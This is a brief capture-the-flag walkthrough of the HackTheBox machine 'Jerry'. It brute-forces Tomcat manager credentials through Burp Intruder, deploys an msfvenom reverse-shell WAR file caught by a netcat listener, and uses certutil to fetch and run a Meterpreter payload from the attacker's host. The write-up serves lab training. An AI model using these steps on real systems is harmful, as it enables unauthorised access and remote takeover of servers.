```md

[*] Walkthrough For Jerry On HackTheBox

[+] Scanning And Emumeration

[+] Open Port

8080/tcp

[*] Found Out Tomcat Default Webpage
[*] Googled Default Credentials For Tomcat
[*] Found A Github Site. 

https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown

[*] Exploitation

[*] Open Burp
[*] Intercept
[*] Get A Request
[*] Send It To Decoder(As The Data Is Encrypted In Base64)
[*] Select The Encoded Text
[*] Select Base64 From Options
[*] You Should Get A Decoded Data String Now. 

[*] Cracking Or BruteForcing It

[*] Send The Request To Intruder And Repeater(We Can See A 404 Forbidden Error In The Request)
[*] Change The Format Of The Default Credentials List
[*] Like: tomcat:tomcat
[*] Convert The List To Base64 By:

for cred in $(cat list.txt); do echo -n $cred | base64; done

[*] Go To Burp(Intruder)
[*] In Positions Tab, Select The Encoded Data And Click On Add(Sniper Attack)
[*] Go To The Payloads Tab And Add All The Encoded Base64 Text In The List(Payload List, Simple)
[*] Click On Start Attack
[*] Look For Status Code 200
[+] Found Credentials

tomcat:s3cret

[*] Lets Add A Malicious WAR File. 

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=4444 -f war > shell.war

[*] Upload The WAR File
[*] Click On Deploy
[*] Setup A Netcat Listener

nc -lnvp 4444

[*] Click On Your File
[*] We Have A Shell
[*] Authority System
[*] If You Want, You Can Upgrade It To A Meterpreter Shell. 
[*] Make Windows Payload And Copy This To Victim Using A Python SimpleHTTPServer. 
[*] Useful Command:

certutil -urlcache -f http://<IP>/Shell.exe

[*] Alternative For wget On Windows
[*] Run It. 

shell.exe

[*] Got A Meterpreter Session
[*] Done!
